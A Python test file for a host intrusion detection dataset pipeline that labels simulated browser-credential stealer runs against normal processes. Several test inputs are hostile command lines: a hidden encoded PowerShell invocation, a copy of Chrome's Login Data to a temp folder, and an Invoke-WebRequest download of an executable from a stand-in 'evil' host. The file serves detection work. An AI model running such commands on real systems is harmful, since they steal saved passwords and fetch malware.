"""
Tests for the HIDS dataset pipeline (hids/dataset/).
Run from repo root:  python -m pytest hids/tests/test_dataset.py -q

Nothing here runs the real stealer payload or touches real browser files; the
simulator is exercised only through its pure helpers.
"""

import json
import os
import tempfile
import unittest
from pathlib import Path

import pandas as pd

from hids.dataset.features import (
    EMPTY_FILE_FEATURES,
    FEATURE_COLUMNS,
    ID_COLUMNS,
    Corpus,
    aggregate_file_events,
    build_run_features,
    cmdline_flags,
    is_user_space,
    path_bucket,
)
from hids.dataset import build_dataset
from hids.dataset.stealer_simulator import load_manifest, manifest_run_keys

TEMP_EXE = r"C:\Users\Lab\AppData\Local\Temp\sentinel\svchost_update.exe"
CHROME_EXE = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
LOGIN_DATA = r"C:\Users\Lab\AppData\Local\Google\Chrome\User Data\Default\Login Data"


def proc_run(pid, create_time, event="EXIT", **kw):
    row = {
        "event": event, "pid": pid, "create_time": create_time, "ppid": 1,
        "process_name": kw.get("process_name", "chrome.exe"),
        "parent_name": kw.get("parent_name", "explorer.exe"),
        "exe_path": kw.get("exe_path", CHROME_EXE),
        "cmdline": kw.get("cmdline", CHROME_EXE),
        "lifetime_s": kw.get("lifetime_s", 120.0), "samples": kw.get("samples", 4),
        "cpu_mean": kw.get("cpu_mean", 1.0), "cpu_max": kw.get("cpu_max", 5.0),
        "memory_max_mb": kw.get("memory_max_mb", 200.0),
    }
    return row


# ---------------------------------------------------------------
# Path buckets
# ---------------------------------------------------------------

class TestPathBucket(unittest.TestCase):

    def test_buckets(self):
        self.assertEqual(path_bucket(TEMP_EXE), "temp")
        self.assertEqual(path_bucket(CHROME_EXE), "program_files")
        self.assertEqual(path_bucket(r"C:\Windows\System32\svchost.exe"), "system")
        self.assertEqual(path_bucket(r"C:\Users\Lab\Downloads\setup.exe"), "downloads")
        self.assertEqual(path_bucket(r"C:\Users\Lab\AppData\Roaming\app\a.exe"), "appdata_roaming")
        self.assertEqual(path_bucket(r"C:\Users\Lab\AppData\Local\app\a.exe"), "appdata_local")
        self.assertEqual(path_bucket(""), "unknown")

    def test_temp_beats_appdata_local(self):
        # Temp lives under AppData\Local but must bucket as temp
        self.assertEqual(path_bucket(r"C:\Users\x\AppData\Local\Temp\a.exe"), "temp")

    def test_is_user_space(self):
        self.assertTrue(is_user_space("temp"))
        self.assertTrue(is_user_space("appdata_roaming"))
        self.assertFalse(is_user_space("program_files"))
        self.assertFalse(is_user_space("system"))


# ---------------------------------------------------------------
# Command-line flags
# ---------------------------------------------------------------

class TestCmdlineFlags(unittest.TestCase):

    def test_benign(self):
        f = cmdline_flags(CHROME_EXE)
        self.assertEqual(f["cmd_encoded"], 0)
        self.assertEqual(f["cmd_hidden"], 0)
        self.assertGreater(f["cmd_len"], 0)

    def test_encoded_hidden_powershell(self):
        f = cmdline_flags("powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA")
        self.assertEqual(f["cmd_encoded"], 1)
        self.assertEqual(f["cmd_hidden"], 1)
        self.assertEqual(f["cmd_noninteractive_bypass"], 1)

    def test_browser_data_and_download(self):
        f = cmdline_flags(r'cmd /c copy "C:\Users\x\AppData\Local\Google\Chrome\User Data\Default\Login Data" %TEMP%')
        self.assertEqual(f["cmd_browser_data"], 1)
        g = cmdline_flags("powershell Invoke-WebRequest http://evil/a.exe")
        self.assertEqual(g["cmd_download"], 1)
        self.assertEqual(g["cmd_has_url"], 1)


# ---------------------------------------------------------------
# Corpus rarity
# ---------------------------------------------------------------

class TestCorpus(unittest.TestCase):

    def test_frequencies(self):
        runs = [proc_run(i, 1.0 + i, process_name="chrome.exe", parent_name="explorer.exe") for i in range(9)]
        runs.append(proc_run(99, 50.0, process_name="svchost_update.exe", parent_name="cmd.exe"))
        corpus = Corpus(runs)
        self.assertAlmostEqual(corpus.name_freq("chrome.exe"), 0.9)
        self.assertAlmostEqual(corpus.name_freq("svchost_update.exe"), 0.1)
        self.assertEqual(corpus.name_freq("never_seen.exe"), 0.0)
        self.assertAlmostEqual(corpus.pair_freq("explorer.exe", "chrome.exe"), 0.9)
        self.assertAlmostEqual(corpus.pair_freq("cmd.exe", "svchost_update.exe"), 0.1)

    def test_empty_corpus_safe(self):
        self.assertEqual(Corpus([]).name_freq("x"), 0.0)


# ---------------------------------------------------------------
# File-event aggregation
# ---------------------------------------------------------------

class TestAggregateFileEvents(unittest.TestCase):

    def test_groups_by_run_key_and_flags_types(self):
        events = [
            {"pid": 10, "create_time": 5.0, "event_type": "READ", "file_type": "Saved Passwords DB",
             "browser": "Chrome", "accessor_is_owner": 0},
            {"pid": 10, "create_time": 5.0, "event_type": "READ", "file_type": "LocalState (Master Key)",
             "browser": "Chrome", "accessor_is_owner": 0},
            {"pid": 10, "create_time": 5.0, "event_type": "READ", "file_type": "CookieDB",
             "browser": "Edge", "accessor_is_owner": 0},
        ]
        agg = aggregate_file_events(events)
        key = (10, 5.0)
        self.assertIn(key, agg)
        self.assertEqual(agg[key]["file_reads"], 3)
        self.assertEqual(agg[key]["touched_password_db"], 1)
        self.assertEqual(agg[key]["touched_master_key"], 1)
        self.assertEqual(agg[key]["touched_cookies"], 1)
        self.assertEqual(agg[key]["distinct_sensitive_types"], 3)
        self.assertEqual(agg[key]["distinct_browsers"], 2)
        self.assertEqual(agg[key]["accessed_not_owner"], 1)

    def test_owner_access(self):
        events = [{"pid": 7, "create_time": 1.0, "event_type": "MODIFY", "file_type": "CookieDB",
                   "browser": "Chrome", "accessor_is_owner": 1}]
        agg = aggregate_file_events(events)[(7, 1.0)]
        self.assertEqual(agg["file_writes"], 1)
        self.assertEqual(agg["accessed_as_owner"], 1)
        self.assertEqual(agg["accessed_not_owner"], 0)

    def test_rows_without_pid_ignored(self):
        events = [{"pid": "", "create_time": "", "event_type": "MODIFY", "file_type": "CookieDB"}]
        self.assertEqual(aggregate_file_events(events), {})


# ---------------------------------------------------------------
# Feature row
# ---------------------------------------------------------------

class TestBuildRunFeatures(unittest.TestCase):

    def setUp(self):
        self.corpus = Corpus([proc_run(i, float(i)) for i in range(10)])

    def test_benign_browser_run(self):
        row = build_run_features(proc_run(100, 1.0), self.corpus)
        self.assertEqual(set(row), set(ID_COLUMNS + FEATURE_COLUMNS))
        self.assertEqual(row["label"], "Normal")
        self.assertEqual(row["path_bucket"], "program_files")
        self.assertEqual(row["from_temp_or_downloads"], 0)
        self.assertEqual(row["parent_is_shell"], 0)
        self.assertEqual(row["file_reads"], 0)

    def test_stealer_run_features(self):
        run = proc_run(
            6700, 123.456, process_name="svchost_update.exe", parent_name="cmd.exe",
            exe_path=TEMP_EXE, cmdline=TEMP_EXE + " --payload", lifetime_s=0.9,
        )
        agg = aggregate_file_events([
            {"pid": 6700, "create_time": 123.456, "event_type": "READ",
             "file_type": "Saved Passwords DB", "browser": "Chrome", "accessor_is_owner": 0},
        ])
        row = build_run_features(run, self.corpus, file_features=agg[(6700, 123.456)], label="Stealer")
        self.assertEqual(row["label"], "Stealer")
        self.assertEqual(row["from_temp_or_downloads"], 1)
        self.assertEqual(row["from_user_space"], 1)
        self.assertEqual(row["parent_is_shell"], 1)
        self.assertEqual(row["name_freq"], 0.0)  # never seen in benign corpus
        self.assertEqual(row["touched_password_db"], 1)
        self.assertEqual(row["accessed_not_owner"], 1)
        self.assertEqual(row["file_reads"], 1)

    def test_negative_lifetime_clipped_and_cpu_capped(self):
        row = build_run_features(proc_run(1, 1.0, lifetime_s=-0.4, cpu_max=140.0), self.corpus)
        self.assertEqual(row["lifetime_s"], 0.0)
        self.assertEqual(row["cpu_max"], 100.0)

    def test_is_running_for_end_rows(self):
        self.assertEqual(build_run_features(proc_run(1, 1.0, event="END"), self.corpus)["is_running"], 1)
        self.assertEqual(build_run_features(proc_run(1, 1.0, event="EXIT"), self.corpus)["is_running"], 0)

    def test_name_exe_mismatch(self):
        run = proc_run(1, 1.0, process_name="chrome.exe", exe_path=r"C:\Temp\chrome.exe")
        self.assertEqual(build_run_features(run, self.corpus)["name_exe_mismatch"], 0)
        run2 = proc_run(1, 1.0, process_name="notchrome.exe", exe_path=r"C:\Temp\chrome.exe")
        self.assertEqual(build_run_features(run2, self.corpus)["name_exe_mismatch"], 1)

    def test_missing_file_features_default_zero(self):
        row = build_run_features(proc_run(1, 1.0), self.corpus)
        for col in EMPTY_FILE_FEATURES:
            self.assertEqual(row[col], 0)


# ---------------------------------------------------------------
# Manifest
# ---------------------------------------------------------------

class TestManifest(unittest.TestCase):

    def test_load_and_run_keys(self):
        tmp = tempfile.mkdtemp()
        path = os.path.join(tmp, "m.jsonl")
        with open(path, "w", encoding="utf-8") as f:
            f.write(json.dumps({"pid": 10, "create_time": 5.0, "label": "Stealer"}) + "\n")
            f.write(json.dumps({"pid": 11, "create_time": 6.5, "label": "Stealer"}) + "\n")
        self.assertEqual(len(load_manifest(path)), 2)
        keys = manifest_run_keys(path)
        self.assertIn((10, 5.0), keys)
        self.assertIn((11, 6.5), keys)

    def test_missing_manifest(self):
        self.assertEqual(load_manifest(r"C:\nope\missing.jsonl"), [])


# ---------------------------------------------------------------
# End-to-end build_dataset
# ---------------------------------------------------------------

class TestBuildDataset(unittest.TestCase):

    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.proc_csv = os.path.join(self.dir, "process_events_2026-10-03.csv")
        self.file_csv = os.path.join(self.dir, "file_events_2026-10-03.csv")
        self.manifest = os.path.join(self.dir, "m.jsonl")

        rows = [proc_run(1000 + i, 100.0 + i, process_name="chrome.exe") for i in range(5)]
        rows.append(proc_run(2000, 500.0, process_name="svchost_update.exe", parent_name="cmd.exe",
                             exe_path=TEMP_EXE, cmdline=TEMP_EXE + " --payload", lifetime_s=0.8, event="EXIT"))
        rows.append(proc_run(3000, 600.0, process_name="code.exe", event="END"))
        pd.DataFrame(rows).to_csv(self.proc_csv, index=False)

        pd.DataFrame([
            {"timestamp": 1.0, "event_type": "READ", "pid": 2000, "create_time": 500.0,
             "process_name": "svchost_update.exe", "exe_path": TEMP_EXE, "parent_name": "cmd.exe",
             "file_path": LOGIN_DATA, "file_type": "Saved Passwords DB", "browser": "Chrome",
             "accessor_is_owner": 0, "access_mask": "0x1", "source": "audit"},
            {"timestamp": 2.0, "event_type": "READ", "pid": 1000, "create_time": 100.0,
             "process_name": "chrome.exe", "exe_path": CHROME_EXE, "parent_name": "explorer.exe",
             "file_path": LOGIN_DATA, "file_type": "Saved Passwords DB", "browser": "Chrome",
             "accessor_is_owner": 1, "access_mask": "0x1", "source": "audit"},
        ]).to_csv(self.file_csv, index=False)

        with open(self.manifest, "w", encoding="utf-8") as f:
            f.write(json.dumps({"pid": 2000, "create_time": 500.0, "label": "Stealer"}) + "\n")

    def test_classify_csv(self):
        self.assertEqual(build_dataset.classify_csv(self.proc_csv), "process")
        self.assertEqual(build_dataset.classify_csv(self.file_csv), "file")

    def test_end_to_end(self):
        df = build_dataset.build([self.proc_csv], [self.file_csv], [self.manifest])
        self.assertEqual(len(df), 7)
        self.assertEqual((df.label == "Stealer").sum(), 1)
        self.assertEqual((df.label == "Normal").sum(), 6)

        stealer = df[df.label == "Stealer"].iloc[0]
        self.assertEqual(stealer["process_name"], "svchost_update.exe")
        self.assertEqual(stealer["from_temp_or_downloads"], 1)
        self.assertEqual(stealer["parent_is_shell"], 1)
        self.assertEqual(stealer["touched_password_db"], 1)
        self.assertEqual(stealer["accessed_not_owner"], 1)
        self.assertEqual(stealer["name_freq"], 0.0)

        # The browser reading its own file is owner access, labelled Normal
        chrome = df[(df.process_name == "chrome.exe") & (df.file_reads > 0)].iloc[0]
        self.assertEqual(chrome["label"], "Normal")
        self.assertEqual(chrome["accessed_as_owner"], 1)
        self.assertEqual(chrome["touched_password_db"], 1)

    def test_no_raw_paths_in_output(self):
        df = build_dataset.build([self.proc_csv], [self.file_csv], [self.manifest])
        self.assertNotIn("exe_path", df.columns)
        self.assertNotIn("cmdline", df.columns)

    def test_stealer_run_not_in_corpus(self):
        # name_freq of the stealer must be 0 even though it is in the process CSV,
        # i.e. the labelled stealer run is excluded from the benign frequency corpus.
        df = build_dataset.build([self.proc_csv], [self.file_csv], [self.manifest])
        self.assertEqual(df[df.label == "Stealer"].iloc[0]["name_freq"], 0.0)

    def test_discover_inputs(self):
        proc, files = build_dataset.discover_inputs(self.dir)
        self.assertIn(self.proc_csv, proc)
        self.assertIn(self.file_csv, files)


if __name__ == "__main__":
    unittest.main()
